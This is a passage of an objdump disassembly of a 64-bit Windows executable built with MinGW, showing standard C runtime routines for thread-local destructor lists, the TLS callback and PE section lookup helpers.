   1400033bf:	ff d7                	call   *%rdi
   1400033c1:	48 85 f6             	test   %rsi,%rsi
   1400033c4:	74 0d                	je     1400033d3 <__mingwthr_run_key_dtors.part.0+0x53>
   1400033c6:	85 c0                	test   %eax,%eax
   1400033c8:	75 09                	jne    1400033d3 <__mingwthr_run_key_dtors.part.0+0x53>
   1400033ca:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1400033ce:	48 89 f1             	mov    %rsi,%rcx
   1400033d1:	ff d0                	call   *%rax
   1400033d3:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   1400033d7:	48 85 db             	test   %rbx,%rbx
   1400033da:	75 dc                	jne    1400033b8 <__mingwthr_run_key_dtors.part.0+0x38>
   1400033dc:	4c 89 e1             	mov    %r12,%rcx
   1400033df:	48 83 c4 20          	add    $0x20,%rsp
   1400033e3:	5b                   	pop    %rbx
   1400033e4:	5e                   	pop    %rsi
   1400033e5:	5f                   	pop    %rdi
   1400033e6:	5d                   	pop    %rbp
   1400033e7:	41 5c                	pop    %r12
   1400033e9:	48 ff 25 40 cf 00 00 	rex.W jmp *0xcf40(%rip)        # 140010330 <__imp_LeaveCriticalSection>

00000001400033f0 <___w64_mingwthr_add_key_dtor>:
   1400033f0:	57                   	push   %rdi
   1400033f1:	56                   	push   %rsi
   1400033f2:	53                   	push   %rbx
   1400033f3:	48 83 ec 20          	sub    $0x20,%rsp
   1400033f7:	8b 05 eb bc 00 00    	mov    0xbceb(%rip),%eax        # 14000f0e8 <__mingwthr_cs_init>
   1400033fd:	89 cf                	mov    %ecx,%edi
   1400033ff:	48 89 d6             	mov    %rdx,%rsi
   140003402:	85 c0                	test   %eax,%eax
   140003404:	75 0a                	jne    140003410 <___w64_mingwthr_add_key_dtor+0x20>
   140003406:	31 c0                	xor    %eax,%eax
   140003408:	48 83 c4 20          	add    $0x20,%rsp
   14000340c:	5b                   	pop    %rbx
   14000340d:	5e                   	pop    %rsi
   14000340e:	5f                   	pop    %rdi
   14000340f:	c3                   	ret
   140003410:	ba 18 00 00 00       	mov    $0x18,%edx
   140003415:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000341a:	e8 79 5f 00 00       	call   140009398 <calloc>
   14000341f:	48 89 c3             	mov    %rax,%rbx
   140003422:	48 85 c0             	test   %rax,%rax
   140003425:	74 33                	je     14000345a <___w64_mingwthr_add_key_dtor+0x6a>
   140003427:	48 89 70 08          	mov    %rsi,0x8(%rax)
   14000342b:	48 8d 35 ce bc 00 00 	lea    0xbcce(%rip),%rsi        # 14000f100 <__mingwthr_cs>
   140003432:	89 38                	mov    %edi,(%rax)
   140003434:	48 89 f1             	mov    %rsi,%rcx
   140003437:	ff 15 c3 ce 00 00    	call   *0xcec3(%rip)        # 140010300 <__imp_EnterCriticalSection>
   14000343d:	48 8b 05 9c bc 00 00 	mov    0xbc9c(%rip),%rax        # 14000f0e0 <key_dtor_list>
   140003444:	48 89 f1             	mov    %rsi,%rcx
   140003447:	48 89 1d 92 bc 00 00 	mov    %rbx,0xbc92(%rip)        # 14000f0e0 <key_dtor_list>
   14000344e:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140003452:	ff 15 d8 ce 00 00    	call   *0xced8(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   140003458:	eb ac                	jmp    140003406 <___w64_mingwthr_add_key_dtor+0x16>
   14000345a:	83 c8 ff             	or     $0xffffffff,%eax
   14000345d:	eb a9                	jmp    140003408 <___w64_mingwthr_add_key_dtor+0x18>
   14000345f:	90                   	nop

0000000140003460 <___w64_mingwthr_remove_key_dtor>:
   140003460:	56                   	push   %rsi
   140003461:	53                   	push   %rbx
   140003462:	48 83 ec 28          	sub    $0x28,%rsp
   140003466:	8b 05 7c bc 00 00    	mov    0xbc7c(%rip),%eax        # 14000f0e8 <__mingwthr_cs_init>
   14000346c:	89 cb                	mov    %ecx,%ebx
   14000346e:	85 c0                	test   %eax,%eax
   140003470:	75 0e                	jne    140003480 <___w64_mingwthr_remove_key_dtor+0x20>
   140003472:	31 c0                	xor    %eax,%eax
   140003474:	48 83 c4 28          	add    $0x28,%rsp
   140003478:	5b                   	pop    %rbx
   140003479:	5e                   	pop    %rsi
   14000347a:	c3                   	ret
   14000347b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003480:	48 8d 35 79 bc 00 00 	lea    0xbc79(%rip),%rsi        # 14000f100 <__mingwthr_cs>
   140003487:	48 89 f1             	mov    %rsi,%rcx
   14000348a:	ff 15 70 ce 00 00    	call   *0xce70(%rip)        # 140010300 <__imp_EnterCriticalSection>
   140003490:	48 8b 0d 49 bc 00 00 	mov    0xbc49(%rip),%rcx        # 14000f0e0 <key_dtor_list>
   140003497:	48 85 c9             	test   %rcx,%rcx
   14000349a:	74 27                	je     1400034c3 <___w64_mingwthr_remove_key_dtor+0x63>
   14000349c:	31 d2                	xor    %edx,%edx
   14000349e:	eb 0b                	jmp    1400034ab <___w64_mingwthr_remove_key_dtor+0x4b>
   1400034a0:	48 89 ca             	mov    %rcx,%rdx
   1400034a3:	48 85 c0             	test   %rax,%rax
   1400034a6:	74 1b                	je     1400034c3 <___w64_mingwthr_remove_key_dtor+0x63>
   1400034a8:	48 89 c1             	mov    %rax,%rcx
   1400034ab:	8b 01                	mov    (%rcx),%eax
   1400034ad:	39 d8                	cmp    %ebx,%eax
   1400034af:	48 8b 41 10          	mov    0x10(%rcx),%rax
   1400034b3:	75 eb                	jne    1400034a0 <___w64_mingwthr_remove_key_dtor+0x40>
   1400034b5:	48 85 d2             	test   %rdx,%rdx
   1400034b8:	74 1e                	je     1400034d8 <___w64_mingwthr_remove_key_dtor+0x78>
   1400034ba:	48 89 42 10          	mov    %rax,0x10(%rdx)
   1400034be:	e8 f5 5e 00 00       	call   1400093b8 <free>
   1400034c3:	48 89 f1             	mov    %rsi,%rcx
   1400034c6:	ff 15 64 ce 00 00    	call   *0xce64(%rip)        # 140010330 <__imp_LeaveCriticalSection>
   1400034cc:	31 c0                	xor    %eax,%eax
   1400034ce:	48 83 c4 28          	add    $0x28,%rsp
   1400034d2:	5b                   	pop    %rbx
   1400034d3:	5e                   	pop    %rsi
   1400034d4:	c3                   	ret
   1400034d5:	0f 1f 00             	nopl   (%rax)
   1400034d8:	48 89 05 01 bc 00 00 	mov    %rax,0xbc01(%rip)        # 14000f0e0 <key_dtor_list>
   1400034df:	eb dd                	jmp    1400034be <___w64_mingwthr_remove_key_dtor+0x5e>
   1400034e1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400034e8:	00 00 00 00 
   1400034ec:	0f 1f 40 00          	nopl   0x0(%rax)

00000001400034f0 <__mingw_TLScallback>:
   1400034f0:	53                   	push   %rbx
   1400034f1:	48 83 ec 20          	sub    $0x20,%rsp
   1400034f5:	83 fa 02             	cmp    $0x2,%edx
   1400034f8:	0f 84 b2 00 00 00    	je     1400035b0 <__mingw_TLScallback+0xc0>
   1400034fe:	77 30                	ja     140003530 <__mingw_TLScallback+0x40>
   140003500:	85 d2                	test   %edx,%edx
   140003502:	74 4c                	je     140003550 <__mingw_TLScallback+0x60>
   140003504:	8b 05 de bb 00 00    	mov    0xbbde(%rip),%eax        # 14000f0e8 <__mingwthr_cs_init>
   14000350a:	85 c0                	test   %eax,%eax
   14000350c:	0f 84 be 00 00 00    	je     1400035d0 <__mingw_TLScallback+0xe0>
   140003512:	c7 05 cc bb 00 00 01 	movl   $0x1,0xbbcc(%rip)        # 14000f0e8 <__mingwthr_cs_init>
   140003519:	00 00 00 
   14000351c:	b8 01 00 00 00       	mov    $0x1,%eax
   140003521:	48 83 c4 20          	add    $0x20,%rsp
   140003525:	5b                   	pop    %rbx
   140003526:	c3                   	ret
   140003527:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000352e:	00 00 
   140003530:	83 fa 03             	cmp    $0x3,%edx
   140003533:	75 e7                	jne    14000351c <__mingw_TLScallback+0x2c>
   140003535:	8b 05 ad bb 00 00    	mov    0xbbad(%rip),%eax        # 14000f0e8 <__mingwthr_cs_init>
   14000353b:	85 c0                	test   %eax,%eax
   14000353d:	74 dd                	je     14000351c <__mingw_TLScallback+0x2c>
   14000353f:	e8 3c fe ff ff       	call   140003380 <__mingwthr_run_key_dtors.part.0>
   140003544:	eb d6                	jmp    14000351c <__mingw_TLScallback+0x2c>
   140003546:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000354d:	00 00 00 
   140003550:	8b 05 92 bb 00 00    	mov    0xbb92(%rip),%eax        # 14000f0e8 <__mingwthr_cs_init>
   140003556:	85 c0                	test   %eax,%eax
   140003558:	75 66                	jne    1400035c0 <__mingw_TLScallback+0xd0>
   14000355a:	8b 05 88 bb 00 00    	mov    0xbb88(%rip),%eax        # 14000f0e8 <__mingwthr_cs_init>
   140003560:	83 f8 01             	cmp    $0x1,%eax
   140003563:	75 b7                	jne    14000351c <__mingw_TLScallback+0x2c>
   140003565:	48 8b 1d 74 bb 00 00 	mov    0xbb74(%rip),%rbx        # 14000f0e0 <key_dtor_list>
   14000356c:	48 85 db             	test   %rbx,%rbx
   14000356f:	74 18                	je     140003589 <__mingw_TLScallback+0x99>
   140003571:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003578:	48 89 d9             	mov    %rbx,%rcx
   14000357b:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   14000357f:	e8 34 5e 00 00       	call   1400093b8 <free>
   140003584:	48 85 db             	test   %rbx,%rbx
   140003587:	75 ef                	jne    140003578 <__mingw_TLScallback+0x88>
   140003589:	48 8d 0d 70 bb 00 00 	lea    0xbb70(%rip),%rcx        # 14000f100 <__mingwthr_cs>
   140003590:	48 c7 05 45 bb 00 00 	movq   $0x0,0xbb45(%rip)        # 14000f0e0 <key_dtor_list>
   140003597:	00 00 00 00 
   14000359b:	c7 05 43 bb 00 00 00 	movl   $0x0,0xbb43(%rip)        # 14000f0e8 <__mingwthr_cs_init>
   1400035a2:	00 00 00 
   1400035a5:	ff 15 4d cd 00 00    	call   *0xcd4d(%rip)        # 1400102f8 <__imp_DeleteCriticalSection>
   1400035ab:	e9 6c ff ff ff       	jmp    14000351c <__mingw_TLScallback+0x2c>
   1400035b0:	e8 5b f6 ff ff       	call   140002c10 <_fpreset>
   1400035b5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400035ba:	48 83 c4 20          	add    $0x20,%rsp
   1400035be:	5b                   	pop    %rbx
   1400035bf:	c3                   	ret
   1400035c0:	e8 bb fd ff ff       	call   140003380 <__mingwthr_run_key_dtors.part.0>
   1400035c5:	eb 93                	jmp    14000355a <__mingw_TLScallback+0x6a>
   1400035c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400035ce:	00 00 
   1400035d0:	48 8d 0d 29 bb 00 00 	lea    0xbb29(%rip),%rcx        # 14000f100 <__mingwthr_cs>
   1400035d7:	ff 15 43 cd 00 00    	call   *0xcd43(%rip)        # 140010320 <__imp_InitializeCriticalSection>
   1400035dd:	e9 30 ff ff ff       	jmp    140003512 <__mingw_TLScallback+0x22>
   1400035e2:	90                   	nop
   1400035e3:	90                   	nop
   1400035e4:	90                   	nop
   1400035e5:	90                   	nop
   1400035e6:	90                   	nop
   1400035e7:	90                   	nop
   1400035e8:	90                   	nop
   1400035e9:	90                   	nop
   1400035ea:	90                   	nop
   1400035eb:	90                   	nop
   1400035ec:	90                   	nop
   1400035ed:	90                   	nop
   1400035ee:	90                   	nop
   1400035ef:	90                   	nop

00000001400035f0 <_ValidateImageBase>:
   1400035f0:	31 c0                	xor    %eax,%eax
   1400035f2:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   1400035f7:	75 0f                	jne    140003608 <_ValidateImageBase+0x18>
   1400035f9:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   1400035fd:	48 01 d1             	add    %rdx,%rcx
   140003600:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140003606:	74 08                	je     140003610 <_ValidateImageBase+0x20>
   140003608:	c3                   	ret
   140003609:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003610:	31 c0                	xor    %eax,%eax
   140003612:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140003618:	0f 94 c0             	sete   %al
   14000361b:	c3                   	ret
   14000361c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140003620 <_FindPESection>:
   140003620:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   140003624:	48 01 c1             	add    %rax,%rcx
   140003627:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   14000362b:	44 0f b7 41 06       	movzwl 0x6(%rcx),%r8d
   140003630:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
   140003635:	66 45 85 c0          	test   %r8w,%r8w
   140003639:	74 32                	je     14000366d <_FindPESection+0x4d>
   14000363b:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   14000363f:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140003643:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
   140003648:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000364f:	00 
   140003650:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140003654:	4c 89 c1             	mov    %r8,%rcx
   140003657:	4c 39 c2             	cmp    %r8,%rdx
   14000365a:	72 08                	jb     140003664 <_FindPESection+0x44>
   14000365c:	03 48 08             	add    0x8(%rax),%ecx
   14000365f:	48 39 ca             	cmp    %rcx,%rdx
   140003662:	72 0b                	jb     14000366f <_FindPESection+0x4f>
   140003664:	48 83 c0 28          	add    $0x28,%rax
   140003668:	4c 39 c8             	cmp    %r9,%rax
   14000366b:	75 e3                	jne    140003650 <_FindPESection+0x30>
   14000366d:	31 c0                	xor    %eax,%eax
   14000366f:	c3                   	ret

0000000140003670 <_FindPESectionByName>:
   140003670:	57                   	push   %rdi
   140003671:	56                   	push   %rsi
   140003672:	53                   	push   %rbx
   140003673:	48 83 ec 20          	sub    $0x20,%rsp
   140003677:	48 89 ce             	mov    %rcx,%rsi
   14000367a:	e8 81 5d 00 00       	call   140009400 <strlen>
   14000367f:	48 83 f8 08          	cmp    $0x8,%rax
   140003683:	77 7b                	ja     140003700 <_FindPESectionByName+0x90>
   140003685:	48 8b 15 e4 82 00 00 	mov    0x82e4(%rip),%rdx        # 14000b970 <.refptr.__ImageBase>
   14000368c:	31 db                	xor    %ebx,%ebx
   14000368e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   140003693:	75 59                	jne    1400036ee <_FindPESectionByName+0x7e>
   140003695:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   140003699:	48 01 d0             	add    %rdx,%rax
   14000369c:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   1400036a2:	75 4a                	jne    1400036ee <_FindPESectionByName+0x7e>
   1400036a4:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   1400036aa:	75 42                	jne    1400036ee <_FindPESectionByName+0x7e>
   1400036ac:	0f b7 50 14          	movzwl 0x14(%rax),%edx
   1400036b0:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
   1400036b5:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   1400036b9:	66 85 d2             	test   %dx,%dx
   1400036bc:	74 42                	je     140003700 <_FindPESectionByName+0x90>
   1400036be:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1400036c1:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400036c5:	48 8d 7c c3 28       	lea    0x28(%rbx,%rax,8),%rdi
   1400036ca:	eb 0d                	jmp    1400036d9 <_FindPESectionByName+0x69>
   1400036cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400036d0:	48 83 c3 28          	add    $0x28,%rbx
   1400036d4:	48 39 fb             	cmp    %rdi,%rbx
   1400036d7:	74 27                	je     140003700 <_FindPESectionByName+0x90>
   1400036d9:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400036df:	48 89 f2             	mov    %rsi,%rdx
   1400036e2:	48 89 d9             	mov    %rbx,%rcx
   1400036e5:	e8 1e 5d 00 00       	call   140009408 <strncmp>
   1400036ea:	85 c0                	test   %eax,%eax
   1400036ec:	75 e2                	jne    1400036d0 <_FindPESectionByName+0x60>
   1400036ee:	48 89 d8             	mov    %rbx,%rax
   1400036f1:	48 83 c4 20          	add    $0x20,%rsp
   1400036f5:	5b                   	pop    %rbx
   1400036f6:	5e                   	pop    %rsi
   1400036f7:	5f                   	pop    %rdi
   1400036f8:	c3                   	ret
   1400036f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003700:	31 db                	xor    %ebx,%ebx
   140003702:	48 89 d8             	mov    %rbx,%rax
   140003705:	48 83 c4 20          	add    $0x20,%rsp
   140003709:	5b                   	pop    %rbx
   14000370a:	5e                   	pop    %rsi
   14000370b:	5f                   	pop    %rdi
   14000370c:	c3                   	ret
   14000370d:	0f 1f 00             	nopl   (%rax)

0000000140003710 <__mingw_GetSectionForAddress>:
   140003710:	48 8b 15 59 82 00 00 	mov    0x8259(%rip),%rdx        # 14000b970 <.refptr.__ImageBase>
   140003717:	31 c0                	xor    %eax,%eax
   140003719:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   14000371e:	75 10                	jne    140003730 <__mingw_GetSectionForAddress+0x20>
   140003720:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   140003724:	49 01 d0             	add    %rdx,%r8
   140003727:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   14000372e:	74 08                	je     140003738 <__mingw_GetSectionForAddress+0x28>
   140003730:	c3                   	ret
   140003731:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003738:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   14000373f:	75 ef                	jne    140003730 <__mingw_GetSectionForAddress+0x20>
   140003741:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140003746:	48 29 d1             	sub    %rdx,%rcx
   140003749:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
   14000374e:	45 0f b7 40 06       	movzwl 0x6(%r8),%r8d
   140003753:	66 45 85 c0          	test   %r8w,%r8w
   140003757:	74 34                	je     14000378d <__mingw_GetSectionForAddress+0x7d>
   140003759:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   14000375d:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140003761:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   140003766:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000376d:	00 00 00 
   140003770:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140003774:	4c 89 c2             	mov    %r8,%rdx
   140003777:	4c 39 c1             	cmp    %r8,%rcx
   14000377a:	72 08                	jb     140003784 <__mingw_GetSectionForAddress+0x74>
   14000377c:	03 50 08             	add    0x8(%rax),%edx
   14000377f:	48 39 d1             	cmp    %rdx,%rcx
   140003782:	72 ac                	jb     140003730 <__mingw_GetSectionForAddress+0x20>
   140003784:	48 83 c0 28          	add    $0x28,%rax
   140003788:	4c 39 c8             	cmp    %r9,%rax
   14000378b:	75 e3                	jne    140003770 <__mingw_GetSectionForAddress+0x60>
   14000378d:	31 c0                	xor    %eax,%eax
   14000378f:	c3                   	ret

0000000140003790 <__mingw_GetSectionCount>:
   140003790:	48 8b 05 d9 81 00 00 	mov    0x81d9(%rip),%rax        # 14000b970 <.refptr.__ImageBase>
   140003797:	31 c9                	xor    %ecx,%ecx
   140003799:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   14000379e:	75 0f                	jne    1400037af <__mingw_GetSectionCount+0x1f>
   1400037a0:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   1400037a4:	48 01 d0             	add    %rdx,%rax
   1400037a7:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   1400037ad:	74 09                	je     1400037b8 <__mingw_GetSectionCount+0x28>
   1400037af:	89 c8                	mov    %ecx,%eax
   1400037b1:	c3                   	ret
   1400037b2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400037b8:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   1400037be:	75 ef                	jne    1400037af <__mingw_GetSectionCount+0x1f>
   1400037c0:	0f b7 48 06          	movzwl 0x6(%rax),%ecx
   1400037c4:	89 c8                	mov    %ecx,%eax
   1400037c6:	c3                   	ret
   1400037c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400037ce:	00 00 

00000001400037d0 <_FindPESectionExec>:
   1400037d0:	4c 8b 05 99 81 00 00 	mov    0x8199(%rip),%r8        # 14000b970 <.refptr.__ImageBase>
   1400037d7:	31 c0                	xor    %eax,%eax
   1400037d9:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   1400037df:	75 0f                	jne    1400037f0 <_FindPESectionExec+0x20>
   1400037e1:	49 63 50 3c          	movslq 0x3c(%r8),%rdx
   1400037e5:	4c 01 c2             	add    %r8,%rdx
   1400037e8:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   1400037ee:	74 08                	je     1400037f8 <_FindPESectionExec+0x28>
   1400037f0:	c3                   	ret
   1400037f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400037f8:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   1400037fe:	75 f0                	jne    1400037f0 <_FindPESectionExec+0x20>
   140003800:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   140003804:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   140003809:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
   14000380e:	66 45 85 c0          	test   %r8w,%r8w
   140003812:	74 2c                	je     140003840 <_FindPESectionExec+0x70>
   140003814:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   140003818:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   14000381c:	48 8d 54 d0 28       	lea    0x28(%rax,%rdx,8),%rdx
   140003821:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003828:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   14000382c:	74 09                	je     140003837 <_FindPESectionExec+0x67>
   14000382e:	48 85 c9             	test   %rcx,%rcx
   140003831:	74 bd                	je     1400037f0 <_FindPESectionExec+0x20>
   140003833:	48 83 e9 01          	sub    $0x1,%rcx
   140003837:	48 83 c0 28          	add    $0x28,%rax
   14000383b:	48 39 c2             	cmp    %rax,%rdx
   14000383e:	75 e8                	jne    140003828 <_FindPESectionExec+0x58>
   140003840:	31 c0                	xor    %eax,%eax
   140003842:	c3                   	ret
   140003843:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000384a:	00 00 00 00 
   14000384e:	66 90                	xchg   %ax,%ax

0000000140003850 <_GetPEImageBase>:
   140003850:	48 8b 05 19 81 00 00 	mov    0x8119(%rip),%rax        # 14000b970 <.refptr.__ImageBase>
   140003857:	31 d2                	xor    %edx,%edx
   140003859:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   14000385e:	75 0f                	jne    14000386f <_GetPEImageBase+0x1f>
   140003860:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140003864:	48 01 c1             	add    %rax,%rcx
   140003867:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000386d:	74 09                	je     140003878 <_GetPEImageBase+0x28>
   14000386f:	48 89 d0             	mov    %rdx,%rax
   140003872:	c3                   	ret
   140003873:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003878:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   14000387e:	48 0f 44 d0          	cmove  %rax,%rdx
   140003882:	48 89 d0             	mov    %rdx,%rax
   140003885:	c3                   	ret
   140003886:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000388d:	00 00 00 

0000000140003890 <_IsNonwritableInCurrentImage>:
   140003890:	48 8b 15 d9 80 00 00 	mov    0x80d9(%rip),%rdx        # 14000b970 <.refptr.__ImageBase>
   140003897:	31 c0                	xor    %eax,%eax
   140003899:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   14000389e:	75 10                	jne    1400038b0 <_IsNonwritableInCurrentImage+0x20>
   1400038a0:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   1400038a4:	49 01 d0             	add    %rdx,%r8
   1400038a7:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   1400038ae:	74 08                	je     1400038b8 <_IsNonwritableInCurrentImage+0x28>
   1400038b0:	c3                   	ret
   1400038b1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400038b8:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   1400038bf:	75 ef                	jne    1400038b0 <_IsNonwritableInCurrentImage+0x20>
   1400038c1:	48 29 d1             	sub    %rdx,%rcx
   1400038c4:	45 0f b7 48 06       	movzwl 0x6(%r8),%r9d
   1400038c9:	41 0f b7 50 14       	movzwl 0x14(%r8),%edx
   1400038ce:	49 8d 54 10 18       	lea    0x18(%r8,%rdx,1),%rdx
   1400038d3:	66 45 85 c9          	test   %r9w,%r9w
   1400038d7:	74 d7                	je     1400038b0 <_IsNonwritableInCurrentImage+0x20>
   1400038d9:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   1400038dd:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   1400038e1:	4c 8d 4c c2 28       	lea    0x28(%rdx,%rax,8),%r9
   1400038e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400038ed:	00 00 00 
   1400038f0:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
   1400038f4:	4c 89 c0             	mov    %r8,%rax
   1400038f7:	4c 39 c1             	cmp    %r8,%rcx
   1400038fa:	72 08                	jb     140003904 <_IsNonwritableInCurrentImage+0x74>
   1400038fc:	03 42 08             	add    0x8(%rdx),%eax
   1400038ff:	48 39 c1             	cmp    %rax,%rcx
   140003902:	72 0c                	jb     140003910 <_IsNonwritableInCurrentImage+0x80>
   140003904:	48 83 c2 28          	add    $0x28,%rdx
   140003908:	49 39 d1             	cmp    %rdx,%r9
   14000390b:	75 e3                	jne    1400038f0 <_IsNonwritableInCurrentImage+0x60>
   14000390d:	31 c0                	xor    %eax,%eax
   14000390f:	c3                   	ret
   140003910:	8b 42 24             	mov    0x24(%rdx),%eax
   140003913:	f7 d0                	not    %eax
   140003915:	c1 e8 1f             	shr    $0x1f,%eax
   140003918:	c3                   	ret
   140003919:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140003920 <__mingw_enum_import_library_names>:
   140003920:	4c 8b 1d 49 80 00 00 	mov    0x8049(%rip),%r11        # 14000b970 <.refptr.__ImageBase>
   140003927:	45 31 c9             	xor    %r9d,%r9d
   14000392a:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
   140003930:	75 10                	jne    140003942 <__mingw_enum_import_library_names+0x22>
   140003932:	4d 63 43 3c          	movslq 0x3c(%r11),%r8
   140003936:	4d 01 d8             	add    %r11,%r8
   140003939:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   140003940:	74 0e                	je     140003950 <__mingw_enum_import_library_names+0x30>
   140003942:	4c 89 c8             	mov    %r9,%rax
   140003945:	c3                   	ret
   140003946:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000394d:	00 00 00 
   140003950:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   140003957:	75 e9                	jne    140003942 <__mingw_enum_import_library_names+0x22>
   140003959:	41 8b 80 90 00 00 00 	mov    0x90(%r8),%eax
   140003960:	85 c0                	test   %eax,%eax
   140003962:	74 de                	je     140003942 <__mingw_enum_import_library_names+0x22>
   140003964:	41 0f b7 50 14       	movzwl 0x14(%r8),%edx
   140003969:	45 0f b7 50 06       	movzwl 0x6(%r8),%r10d
   14000396e:	49 8d 54 10 18       	lea    0x18(%r8,%rdx,1),%rdx
   140003973:	66 45 85 d2          	test   %r10w,%r10w
   140003977:	74 c9                	je     140003942 <__mingw_enum_import_library_names+0x22>
   140003979:	45 8d 42 ff          	lea    -0x1(%r10),%r8d
   14000397d:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
   140003981:	4e 8d 54 c2 28       	lea    0x28(%rdx,%r8,8),%r10
   140003986:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000398d:	00 00 00 
   140003990:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
   140003994:	4d 89 c8             	mov    %r9,%r8
   140003997:	4c 39 c8             	cmp    %r9,%rax
   14000399a:	72 09                	jb     1400039a5 <__mingw_enum_import_library_names+0x85>
   14000399c:	44 03 42 08          	add    0x8(%rdx),%r8d
   1400039a0:	4c 39 c0             	cmp    %r8,%rax
   1400039a3:	72 13                	jb     1400039b8 <__mingw_enum_import_library_names+0x98>
   1400039a5:	48 83 c2 28          	add    $0x28,%rdx
   1400039a9:	49 39 d2             	cmp    %rdx,%r10
   1400039ac:	75 e2                	jne    140003990 <__mingw_enum_import_library_names+0x70>
   1400039ae:	45 31 c9             	xor    %r9d,%r9d
   1400039b1:	4c 89 c8             	mov    %r9,%rax
   1400039b4:	c3                   	ret
   1400039b5:	0f 1f 00             	nopl   (%rax)
   1400039b8:	4c 01 d8             	add    %r11,%rax
